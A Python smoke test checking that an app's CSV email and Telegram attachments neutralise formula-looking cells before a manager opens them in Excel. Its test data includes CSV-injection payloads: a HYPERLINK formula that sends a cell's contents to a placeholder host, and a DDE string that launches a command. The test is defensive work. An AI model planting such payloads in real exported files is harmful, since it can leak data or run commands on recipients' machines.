"""Email / Telegram CSV attachments are safe to open in a spreadsheet (Pipi N-5).

A Data Table's text can come from MQTT, an API value or a paired device, and
a cell like =HYPERLINK("http://x/?"&A1,"open") runs when a manager opens the
attached CSV in Excel. routes/workflow.py _csv_payload (the one renderer for
the app's attachment, the inspector's Download and Send a test now) now
passes every TEXT cell and header through table_export.safe_cell:

  1. ordinary data is byte-identical to before (golden, against the old writer)
  2. text starting = + - @ tab or CR -- also after leading spaces or quotes --
     gets a leading '; a negative number written as text is left alone
  3. numbers, dates and booleans are written exactly as before
  4. {csv_text} (the rows pasted into the message) is the same safe text

    py -3 tests/smoke_csvsafe.py
"""
import csv
import datetime
import io
import os
import sys
import tempfile
import types

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, ROOT)
os.chdir(ROOT)
os.environ["CYTRON_STORE"] = tempfile.mkdtemp()

try:
    import fastapi                                                # noqa: F401
except ImportError:
    fa = types.ModuleType("fastapi")
    fa.APIRouter = lambda *a, **k: types.SimpleNamespace(
        get=lambda *a, **k: (lambda f: f), post=lambda *a, **k: (lambda f: f),
        put=lambda *a, **k: (lambda f: f), delete=lambda *a, **k: (lambda f: f))
    fa.HTTPException = type("HTTPException", (Exception,), {})
    fa.__getattr__ = lambda name: object
    fr = types.ModuleType("fastapi.responses")
    fr.__getattr__ = lambda name: object
    sys.modules.update({"fastapi": fa, "fastapi.responses": fr})

from core.routes import workflow as wr                          # noqa: E402
from core.services import sqlconsole                            # noqa: E402
from core.services import table_export as tx                    # noqa: E402

bad = 0


def check(label, ok, detail=""):
    global bad
    print(("ok   " if ok else "FAIL ") + label + ("" if ok else f"\n      {detail!r}"))
    if not ok:
        bad += 1


ANSWER = {}
sqlconsole.run = lambda slug, sql, tables, config_dir=None, **k: dict(ok=True, **ANSWER)
DOC = {"csv_sql": "select 1", "csv_tables": [{"key": "t"}], "csv_name": "x.csv"}


def old_writer(columns, rows):
    buf = io.StringIO()
    w = csv.writer(buf, lineterminator="\n")
    w.writerow(columns)
    for r in rows:
        w.writerow(["" if r.get(c) is None else r.get(c) for c in columns])
    return buf.getvalue()


# -- 1. ordinary data: byte-identical --------------------------------------------------
cols = ["date", "cam", "total", "ratio", "ok", "note", "when"]
rows = [{"date": "2026-10-14", "cam": "cam_1", "total": 44, "ratio": 0.25, "ok": True,
         "note": "line 2, bay \"A\"", "when": datetime.datetime(2026, 10, 14, 6, 26, 43)},
        {"date": "2026-10-13", "cam": "cam_2", "total": -3, "ratio": None, "ok": False,
         "note": "-5", "when": None}]
ANSWER.update(columns=cols, rows=rows)
made = wr._csv_payload(None, "demo", DOC)
check("ordinary data is byte-identical to the old file",
      made["text"] == old_writer(cols, rows), made["text"])

# -- 2. formula-looking text is defused ------------------------------------------------
evil = ['=HYPERLINK("http://x/?"&A1,"open")', "+cmd|' /C calc'!A0", "-2+3", "@SUM(A1)",
        "\tx", "\r=1", " =1+1", '"=1+1', "'=1+1", "plain", "-12.5"]
ANSWER.update(columns=["=evil header", "v"], rows=[{"=evil header": e, "v": 1} for e in evil])
made = wr._csv_payload(None, "demo", DOC)
got = list(csv.reader(io.StringIO(made["text"])))
check("a formula-looking header is defused", got[0] == ["'=evil header", "v"], got[0])
cells = [r[0] for r in got[1:]]
want = ["'" + e for e in evil[:9]] + ["plain", "-12.5"]
check("every formula-looking cell gets a leading ' (also after spaces or quotes); "
      "plain text and a negative number written as text are unchanged",
      cells == want, cells)
check("...numbers stay numbers", all(r[1] == "1" for r in got[1:]))
check("the table export's own rule learned the same", tx.safe_cell(" =1") == "' =1"
      and tx.safe_cell('"=1') == "'\"=1" and tx.safe_cell(" -5") == " -5")

# -- 3. {csv_text} is the same safe text ----------------------------------------------
text = wr.csv_tokens("{csv_text}", [made])
check("{csv_text} pastes the same defused rows", "'=HYPERLINK" in text
      and '\n=HYPERLINK' not in text, text[:120])
src = open(os.path.join(ROOT, "core", "routes", "workflow.py"), encoding="utf-8").read()
check("there is still one renderer", src.count("csv.writer(") == 1
      and "table_export.safe_cell(value) if isinstance(value, str) else value" in src)

print(f"{bad} check(s) failed" if bad else "all good")
sys.exit(1 if bad else 0)
